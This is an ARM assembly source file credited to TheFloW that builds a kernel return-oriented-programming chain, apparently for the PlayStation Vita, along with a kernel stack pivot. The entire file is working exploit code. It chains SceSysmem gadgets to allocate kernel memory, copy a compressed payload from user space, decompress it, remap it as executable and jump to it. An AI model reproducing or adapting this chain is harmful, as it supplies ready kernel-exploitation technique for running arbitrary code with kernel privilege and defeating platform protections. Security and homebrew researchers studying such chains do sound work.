/* krop.S -- kernel rop chain
 *
 * Copyright (C) 2018 TheFloW
 *
 * This software may be modified and distributed under the terms
 * of the MIT license.  See the LICENSE file for details.
 */

#include "koffsets.S"

// Variables that lie in the kernel stack
.equ payload_temp_block,   0x00
.equ payload_temp_blockid, 0x04
.equ payload_code_block,   0x08
.equ payload_code_blockid, 0x0C

// Max decompressed payload size; Currently 1 MB, must be a multiple of 4096 bytes!
.equ MAX_PAYLOAD_DECOMPRESSED_SIZE, 0x100000

.macro init_krop dst
  .set krop_chain, \dst
.endm

.macro push base, gadget
  .if \base == 0
    store_vv \gadget, krop_chain
  .elseif \base == 1
    load_add_store krop_chain, sysmem_base, \gadget
  .elseif \base == 2
    load_add_store krop_chain, kstack_base, \gadget
  .elseif \base == 9
    // Dummy
  .endif
  .set krop_chain, krop_chain + 4
.endm

.macro build_krop dst
  // Init krop chain
  init_krop \dst

  // Allocate temporary block
  push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc              // pc
  push 1, SceSysmem_empty_string                       // r0
  push 0, SCE_KERNEL_MEMBLOCK_TYPE_KERNEL_RW           // r1
  push 0, (payload_size + 0xFFF) & ~0xFFF              // r2
  push 0, NULL                                         // r3
  push 1, SceSysmem_sceKernelAllocMemBlockForKernel    // r4
  push 1, SceSysmem_blx_r4_pop_r4_pc                   // pc
  push 2, payload_temp_blockid                         // r4
  push 1, SceSysmem_str_r0_r4_movs_r0_0_pop_r4_pc      // pc
  push 9, 0xDEADBEEF                                   // r4

  // Get temporary block
  push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc              // pc
  push 2, payload_temp_blockid                         // r0
  push 2, payload_temp_block                           // r1
  push 9, 0xDEADBEEF                                   // r2
  push 1, SceSysmem_blx_r4_pop_r4_pc                   // r3
  push 1, SceSysmem_sceKernelGetMemBlockBase           // r4
  push 1, SceSysmem_ldr_r0_r0_blx_r3                   // pc
  push 9, 0xDEADBEEF                                   // r4

  // Allocate code block
  push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc              // pc
  push 1, SceSysmem_empty_string                       // r0
  push 0, SCE_KERNEL_MEMBLOCK_TYPE_KERNEL_RW           // r1
  push 0, MAX_PAYLOAD_DECOMPRESSED_SIZE                // r2
  push 0, NULL                                         // r3
  push 1, SceSysmem_sceKernelAllocMemBlockForKernel    // r4
  push 1, SceSysmem_blx_r4_pop_r4_pc                   // pc
  push 2, payload_code_blockid                         // r4
  push 1, SceSysmem_str_r0_r4_movs_r0_0_pop_r4_pc      // pc
  push 9, 0xDEADBEEF                                   // r4

  // Get code block
  push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc              // pc
  push 2, payload_code_blockid                         // r0
  push 2, payload_code_block                           // r1
  push 9, 0xDEADBEEF                                   // r2
  push 1, SceSysmem_blx_r4_pop_r4_pc                   // r3
  push 1, SceSysmem_sceKernelGetMemBlockBase           // r4
  push 1, SceSysmem_ldr_r0_r0_blx_r3                   // pc
  push 9, 0xDEADBEEF                                   // r4

  // Copy compressed payload from user to temporary block
  push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc              // pc
  push 2, payload_temp_block                           // r0
  push 0, payload_start                                // r1
  push 0, payload_size                                 // r2
  push 1, SceSysmem_blx_r4_pop_r4_pc                   // r3
  push 1, SceSysmem_sceKernelCopyFromUser              // r4
  push 1, SceSysmem_ldr_r0_r0_blx_r3                   // pc
  push 9, 0xDEADBEEF                                   // r4

  // Decompress payload to code block
  push 1, SceSysmem_pop_r3_r4_r5_pc                    // pc
  push 1, SceSysmem_pop_pc                             // r3
  push 1, SceSysmem_sceDeflateDecompress               // r4
  push 2, payload_temp_block - 0x14                    // r5
  push 1, SceSysmem_ldr_r2_r5_14_blx_r3                // pc
  push 1, SceSysmem_pop_r0_r1_pc                       // pc
  push 2, payload_code_block                           // r0
  push 0, MAX_PAYLOAD_DECOMPRESSED_SIZE                // r1
  push 1, SceSysmem_ldr_r0_r0_blx_r3                   // pc
  push 1, SceSysmem_pop_r3_pc                          // pc
  push 0, NULL                                         // r3
  push 1, SceSysmem_blx_r4_pop_r4_pc                   // pc
  push 9, 0xDEADBEEF                                   // r4

  // Free temporary block
  push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc              // pc
  push 2, payload_temp_blockid                         // r0
  push 9, 0xDEADBEEF                                   // r1
  push 9, 0xDEADBEEF                                   // r2
  push 1, SceSysmem_blx_r4_pop_r4_pc                   // r3
  push 1, SceSysmem_sceKernelFreeMemBlock              // r4
  push 1, SceSysmem_ldr_r0_r0_blx_r3                   // pc
  push 9, 0xDEADBEEF                                   // r4

  // Mark code block as executable
  push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc              // pc
  push 2, payload_code_blockid                         // r0
  push 0, SCE_KERNEL_MEMBLOCK_TYPE_KERNEL_RX           // r1
  push 9, 0xDEADBEEF                                   // r2
  push 1, SceSysmem_blx_r4_pop_r4_pc                   // r3
  push 1, SceSysmem_sceKernelRemapMemBlock             // r4
  push 1, SceSysmem_ldr_r0_r0_blx_r3                   // pc
  push 9, 0xDEADBEEF                                   // r4

  // Clean cache
  push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc              // pc
  push 2, payload_code_block                           // r0
  push 0, MAX_PAYLOAD_DECOMPRESSED_SIZE                // r1
  push 9, 0xDEADBEEF                                   // r2
  push 1, SceSysmem_blx_r4_pop_r4_pc                   // r3
  push 1, SceSysmem_sceKernelDcacheCleanRangeForL1WBWA // r4
  push 1, SceSysmem_ldr_r0_r0_blx_r3                   // pc
  push 9, 0xDEADBEEF                                   // r4

  // Execute payload
  push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc              // pc
  push 2, payload_code_block                           // r0
  push 1, 0                                            // r1
  push 0, framebuf                                     // r2
  push 1, SceSysmem_blx_r4_pop_r4_pc                   // r3
  push 1, SceSysmem_adds_r0_1_bx_lr                    // r4
  push 1, SceSysmem_ldr_r0_r0_blx_r3                   // pc
  push 9, 0xDEADBEEF                                   // r4
  push 1, SceSysmem_blx_r0                             // pc
.endm

.macro build_pivot_krop dst
  // Init krop chain
  init_krop \dst

  // Kernel stack pivot
  .set difference, (KSTACK_SIZE - OVERWRITE_SIZE) - KSTACK_DEVCTL_INDATA_OFFSET
  push 1, SceSysmem_pop_r3_r4_r5_r6_r7_pc              // pc
  push 1, SceSysmem_pop_r3_pc                          // r3
  push 1, SceSysmem_sub_r1_r1_r3_bx_lr                 // r4
  push 9, 0xDEADBEEF                                   // r5
  push 1, SceSysmem_pop_pc                             // r6
  push 9, 0xDEADBEEF                                   // r7
  push 1, SceSysmem_add_r1_sp_bc_mov_r2_r6_blx_r3      // pc
  push 0, 0x1C + 0xBC + difference                     // r3
  push 1, SceSysmem_blx_r4_pop_r4_pc                   // pc
  push 9, 0xDEADBEEF                                   // r4
  push 1, SceSysmem_mov_sp_r1_blx_r2                   // pc
.endm
